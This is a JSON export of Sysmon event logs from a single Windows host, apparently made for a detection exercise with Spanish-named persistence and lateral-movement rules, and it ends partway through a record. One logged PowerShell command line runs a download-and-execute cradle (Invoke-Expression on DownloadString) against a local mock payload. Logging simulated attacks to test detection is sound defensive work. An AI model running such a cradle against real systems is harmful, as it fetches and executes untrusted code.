                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:04:04.4847717-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31907,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:04:04.483",
                       "ProcessGuid":  "{f9ed62ee-f06e-6a25-5901-000000009c00}",
                       "ProcessId":  "12544",
                       "Image":  "C:\\WINDOWS\\system32\\svchost.exe",
                       "User":  "NT AUTHORITY\\SYSTEM",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\Microsoft.ScreenSketch_8wekyb3d8bbwe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:04:04.4837614-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31906,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:04:04.483",
                       "ProcessGuid":  "{f9ed62ee-f0b0-6a25-e701-000000009c00}",
                       "ProcessId":  "18792",
                       "Image":  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:04:02.5246390-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31905,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:04:02.523",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:04:01.6852460-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31904,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:04:01.681",
                       "ProcessGuid":  "{f9ed62ee-22f3-6a26-c40e-000000009c00}",
                       "ProcessId":  "11124",
                       "Image":  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  3,
                       "TimeCreated":  "2026-06-07T22:03:55.1830234-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31903,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Movimiento_Lateral",
                       "UtcTime":  "2026-06-08 02:03:53.640",
                       "ProcessGuid":  "{f9ed62ee-f03f-6a25-1a00-000000009c00}",
                       "ProcessId":  "1880",
                       "Image":  "C:\\Windows\\System32\\svchost.exe",
                       "User":  "NT AUTHORITY\\Servicio de red",
                       "Protocol":  "tcp",
                       "Initiated":  "false",
                       "SourceIp":  "127.0.0.1",
                       "SourceHostname":  "DESKTOP-KCP6DQD",
                       "SourcePort":  "55647",
                       "DestinationIp":  "127.0.0.1",
                       "DestinationHostname":  "DESKTOP-KCP6DQD",
                       "DestinationPort":  "3389"
                   },
                   {
                       "EventID":  3,
                       "TimeCreated":  "2026-06-07T22:03:55.1829919-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31902,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Movimiento_Lateral",
                       "UtcTime":  "2026-06-08 02:03:53.640",
                       "ProcessGuid":  "{f9ed62ee-1684-6a26-960c-000000009c00}",
                       "ProcessId":  "21032",
                       "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "Protocol":  "tcp",
                       "Initiated":  "true",
                       "SourceIp":  "127.0.0.1",
                       "SourceHostname":  "DESKTOP-KCP6DQD",
                       "SourcePort":  "55647",
                       "DestinationIp":  "127.0.0.1",
                       "DestinationHostname":  "DESKTOP-KCP6DQD",
                       "DestinationPort":  "3389"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:53.6437903-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31901,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:53.642",
                       "ProcessGuid":  "{f9ed62ee-f03f-6a25-2f00-000000009c00}",
                       "ProcessId":  "2780",
                       "Image":  "C:\\WINDOWS\\system32\\svchost.exe",
                       "User":  "NT AUTHORITY\\Servicio de red",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:52.5214887-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31900,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:52.521",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:42.5157687-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31899,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:42.515",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:03:41.5568948-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31898,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:41.556",
                       "ProcessGuid":  "{f9ed62ee-22fd-6a26-c90e-000000009c00}",
                       "ProcessId":  "15920",
                       "Image":  "C:\\WINDOWS\\system32\\conhost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Windows\\System32\\conhost.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:03:41.4853159-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31897,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:41.484",
                       "ProcessGuid":  "{f9ed62ee-22fd-6a26-c80e-000000009c00}",
                       "ProcessId":  "21524",
                       "Image":  "C:\\Program Files\\Git\\cmd\\git.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Windows\\System32\\conhost.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:03:39.4135459-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31896,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:39.406",
                       "ProcessGuid":  "{f9ed62ee-1f99-6a26-ea0d-000000009c00}",
                       "ProcessId":  "4480",
                       "Image":  "C:\\Users\\nueva\\AppData\\Local\\Programs\\Antigravity IDE\\Antigravity IDE.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Users\\nueva\\AppData\\Local\\Programs\\Antigravity IDE\\Antigravity IDE.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:03:39.1244376-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31895,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:39.123",
                       "ProcessGuid":  "{f9ed62ee-f0b0-6a25-e701-000000009c00}",
                       "ProcessId":  "18792",
                       "Image":  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:03:37.1289047-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31894,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:37.124",
                       "ProcessGuid":  "{f9ed62ee-21a1-6a26-880e-000000009c00}",
                       "ProcessId":  "20120",
                       "Image":  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:32.5019284-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31893,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:32.501",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:32.0396179-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31892,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:32.038",
                       "ProcessGuid":  "{f9ed62ee-f03f-6a25-2f00-000000009c00}",
                       "ProcessId":  "2780",
                       "Image":  "C:\\WINDOWS\\system32\\svchost.exe",
                       "User":  "NT AUTHORITY\\Servicio de red",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:03:31.3883007-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31891,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:31.387",
                       "ProcessGuid":  "{f9ed62ee-f0b0-6a25-e701-000000009c00}",
                       "ProcessId":  "18792",
                       "Image":  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:03:29.2269868-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31890,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:29.218",
                       "ProcessGuid":  "{f9ed62ee-227c-6a26-b90e-000000009c00}",
                       "ProcessId":  "20556",
                       "Image":  "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:22.4886932-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31889,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:22.487",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:16.2118463-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31888,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:16.198",
                       "ProcessGuid":  "{f9ed62ee-f03f-6a25-2f00-000000009c00}",
                       "ProcessId":  "2780",
                       "Image":  "C:\\WINDOWS\\system32\\svchost.exe",
                       "User":  "NT AUTHORITY\\Servicio de red",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:16.0735108-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31887,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:16.072",
                       "ProcessGuid":  "{f9ed62ee-f03e-6a25-0f00-000000009c00}",
                       "ProcessId":  "1420",
                       "Image":  "C:\\WINDOWS\\system32\\svchost.exe",
                       "User":  "NT AUTHORITY\\SYSTEM",
                       "EventType":  "CreateKey",
                       "TargetObject":  "\\REGISTRY\\WC\\Silo03e6a4c0-dbef-2c38-12d2-b46f08f5c09fuser_sid\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:15.9718971-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31886,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:15.961",
                       "ProcessGuid":  "{f9ed62ee-f03e-6a25-0f00-000000009c00}",
                       "ProcessId":  "1420",
                       "Image":  "C:\\WINDOWS\\system32\\svchost.exe",
                       "User":  "NT AUTHORITY\\SYSTEM",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKU\\S-1-5-21-158180708-2764993437-2666828097-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:15.9691548-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31885,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:15.961",
                       "ProcessGuid":  "{f9ed62ee-f03e-6a25-0f00-000000009c00}",
                       "ProcessId":  "1420",
                       "Image":  "C:\\WINDOWS\\system32\\svchost.exe",
                       "User":  "NT AUTHORITY\\SYSTEM",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKU\\S-1-5-21-158180708-2764993437-2666828097-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:12.4814471-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31884,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:12.480",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:03:02.4747015-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31883,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:03:02.474",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:02:52.4690927-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31882,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:02:52.468",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:02:52.0300177-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31881,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:02:52.020",
                       "ProcessGuid":  "{f9ed62ee-f03f-6a25-2f00-000000009c00}",
                       "ProcessId":  "2780",
                       "Image":  "C:\\WINDOWS\\system32\\svchost.exe",
                       "User":  "NT AUTHORITY\\Servicio de red",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:02:42.4673895-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31880,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:02:42.466",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:02:32.4584194-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31879,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:02:32.458",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:02:22.4422196-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31878,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:02:22.441",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  12,
                       "TimeCreated":  "2026-06-07T22:02:12.4360937-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31877,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:02:12.435",
                       "ProcessGuid":  "{f9ed62ee-f06c-6a25-4401-000000009c00}",
                       "ProcessId":  "11680",
                       "Image":  "C:\\WINDOWS\\system32\\sihost.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "CreateKey",
                       "TargetObject":  "HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:02:10.5698786-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31876,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Persistencia_Registro",
                       "UtcTime":  "2026-06-08 02:02:10.569",
                       "ProcessGuid":  "{f9ed62ee-22a0-6a26-be0e-000000009c00}",
                       "ProcessId":  "19672",
                       "Image":  "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "EventType":  "SetValue",
                       "TargetObject":  "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-158180708-2764993437-2666828097-1001\\\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "Details":  "Binary Data"
                   },
                   {
                       "EventID":  5,
                       "TimeCreated":  "2026-06-07T22:02:10.5694586-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31875,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Cierre_Procesos",
                       "UtcTime":  "2026-06-08 02:02:10.568",
                       "ProcessGuid":  "{f9ed62ee-22a0-6a26-be0e-000000009c00}",
                       "ProcessId":  "19672",
                       "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "User":  "DESKTOP-KCP6DQD\\nueva"
                   },
                   {
                       "EventID":  1,
                       "TimeCreated":  "2026-06-07T22:02:08.1839187-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
                       "RecordId":  31874,
                       "ProviderName":  "Microsoft-Windows-Sysmon",
                       "RuleName":  "Deteccion_Procesos_Alertas",
                       "UtcTime":  "2026-06-08 02:02:08.182",
                       "ProcessGuid":  "{f9ed62ee-22a0-6a26-be0e-000000009c00}",
                       "ProcessId":  "19672",
                       "Image":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "CommandLine":  "\"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Command \"Invoke-Expression (New-Object Net.WebClient).DownloadString(\u0027http://127.0.0.1/mock_payload.ps1\u0027)\"",
                       "CurrentDirectory":  "C:\\Asignacion-Sysmon\\",
                       "User":  "DESKTOP-KCP6DQD\\nueva",
                       "LogonGuid":  "{f9ed62ee-f06b-6a25-7fe7-100000000000}",
                       "LogonId":  "0x10e77f",
                       "TerminalSessionId":  "1",
                       "IntegrityLevel":  "High",
                       "Hashes":  "MD5=A97E6573B97B44C96122BFA543A82EA1,SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46",
                       "ParentProcessGuid":  "{f9ed62ee-1684-6a26-960c-000000009c00}",
                       "ParentProcessId":  "21032",
                       "ParentImage":  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       "ParentCommandLine":  "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ",
                       "ParentUser":  "DESKTOP-KCP6DQD\\nueva"
                   },
                   {
                       "EventID":  13,
                       "TimeCreated":  "2026-06-07T22:02:08.1832659-04:00",
                       "Computer":  "DESKTOP-KCP6DQD",
                       "Channel":  "Microsoft-Windows-Sysmon/Operational",
